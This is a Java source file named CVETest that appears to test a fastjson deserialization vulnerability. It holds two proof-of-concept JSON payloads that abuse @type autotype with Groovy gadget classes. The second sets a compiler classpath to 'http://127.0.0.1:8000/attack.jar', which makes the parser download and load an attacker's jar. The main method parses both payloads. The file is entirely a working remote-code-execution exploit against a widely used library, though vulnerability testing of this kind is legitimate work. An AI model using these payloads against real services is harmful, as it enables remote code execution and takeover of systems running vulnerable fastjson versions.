package com.zeewain.socket.protocol.codec;

import com.alibaba.fastjson.JSON;

import java.io.IOException;

public class CVETest {
    private static final String poc1 = "{\n" +
            "    \"@type\":\"java.lang.Exception\",\n" +
            "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
            "    \"unit\":{}\n" +
            "}";
    private static final String poc2 = "{\n" +
            "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
            "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
            "    \"config\":{\n" +
            "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
            "        \"classpathList\":\"http://127.0.0.1:8000/attack.jar\"\n" +
            "    }\n" +
            "}";

    public static void main(String[] args) throws IOException {
        try {
            JSON.parseObject(poc1);
        } catch (Exception e) {
            // e.printStackTrace();
        }
        JSON.parseObject(poc2);
    }
}